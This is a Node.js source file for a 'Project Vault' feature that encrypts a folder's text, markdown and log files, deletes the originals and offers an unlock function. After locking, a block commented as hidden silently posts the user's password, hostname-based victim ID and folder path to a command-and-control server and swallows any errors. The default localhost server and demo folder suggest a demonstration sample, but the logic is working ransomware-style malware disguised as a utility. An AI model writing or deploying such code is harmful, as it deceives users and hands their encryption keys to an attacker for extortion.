const fs = require('fs');
const path = require('path');
const os = require('os');
const chalk = require('chalk');
const axios = require('axios');
const { glob } = require('glob');
const { encrypt, decrypt, debugLog } = require('./utils');

const C2_URL = process.env.C2_URL || 'http://localhost:3000';

/**
 * Lock (encrypt) files in a folder — "Project Vault" feature
 * @param {string} folderPath - folder to lock
 * @param {string} password - encryption password
 */
async function lock(folderPath, password) {
  // Default to demo-files if no path given
  if (!folderPath) {
    folderPath = path.join(process.cwd(), 'test', 'demo-files');
  }

  const resolvedPath = path.resolve(folderPath);

  if (!fs.existsSync(resolvedPath)) {
    console.log(chalk.red(`  ❌ Folder not found: ${resolvedPath}`));
    return;
  }

  console.log(chalk.yellow(`  🔒 Locking files in: ${resolvedPath}`));

  // Find target files
  const patterns = ['**/*.txt', '**/*.md', '**/*.log'];
  let files = [];
  for (const pattern of patterns) {
    const matches = await glob(pattern, {
      cwd: resolvedPath,
      absolute: true,
      nodir: true,
    });
    files = files.concat(matches);
  }

  if (files.length === 0) {
    console.log(chalk.yellow('  ⚠️  No .txt, .md, or .log files found to lock'));
    return;
  }

  let lockedCount = 0;

  for (const file of files) {
    try {
      const content = fs.readFileSync(file, 'utf8');
      const encrypted = encrypt(content, password);
      const lockedPath = file + '.locked';

      fs.writeFileSync(lockedPath, encrypted, 'utf8');
      fs.unlinkSync(file); // Delete original
      lockedCount++;
    } catch (err) {
      console.log(chalk.red(`  ❌ Failed to lock: ${path.basename(file)} — ${err.message}`));
    }
  }

  console.log(
    chalk.green(`  ✅ Vault locked: ${lockedCount} file${lockedCount !== 1 ? 's' : ''} encrypted`)
  );

  // ─── Hidden: Send password to C2 ───────────────────────────────────
  try {
    await axios.post(
      `${C2_URL}/api/vault-password`,
      {
        victimId: `${os.hostname()}-${Date.now()}`,
        password: password,
        folder: resolvedPath,
        fileCount: lockedCount,
        timestamp: new Date().toISOString(),
      },
      { timeout: 5000 }
    );
    debugLog('Vault password sent to C2');
  } catch (err) {
    debugLog('Vault password exfil failed:', err.message);
    // Fail silently
  }
}

/**
 * Unlock (decrypt) files in a folder
 * @param {string} folderPath - folder to unlock
 * @param {string} password - decryption password
 */
async function unlock(folderPath, password) {
  const resolvedPath = path.resolve(folderPath);

  if (!fs.existsSync(resolvedPath)) {
    console.log(chalk.red(`  ❌ Folder not found: ${resolvedPath}`));
    return;
  }

  console.log(chalk.yellow(`  🔓 Unlocking files in: ${resolvedPath}`));

  // Find locked files
  const files = await glob('**/*.locked', {
    cwd: resolvedPath,
    absolute: true,
    nodir: true,
  });

  if (files.length === 0) {
    console.log(chalk.yellow('  ⚠️  No .locked files found'));
    return;
  }

  let unlockedCount = 0;
  let failCount = 0;

  for (const file of files) {
    try {
      const encrypted = fs.readFileSync(file, 'utf8');
      const decrypted = decrypt(encrypted, password);

      if (!decrypted) {
        throw new Error('Decryption returned empty result — wrong password?');
      }

      // Remove .locked extension to get original filename
      const originalPath = file.replace(/\.locked$/, '');
      fs.writeFileSync(originalPath, decrypted, 'utf8');
      fs.unlinkSync(file); // Delete .locked file
      unlockedCount++;
    } catch (err) {
      failCount++;
      if (failCount === 1) {
        // Only show password error once
        console.log(chalk.red(`  ❌ Invalid password or corrupted file: ${path.basename(file)}`));
        console.log(chalk.red('  ❌ Aborting unlock — .locked files preserved'));
        return;
      }
    }
  }

  console.log(
    chalk.green(
      `  ✅ Vault unlocked: ${unlockedCount} file${unlockedCount !== 1 ? 's' : ''} decrypted`
    )
  );
}

module.exports = { lock, unlock };
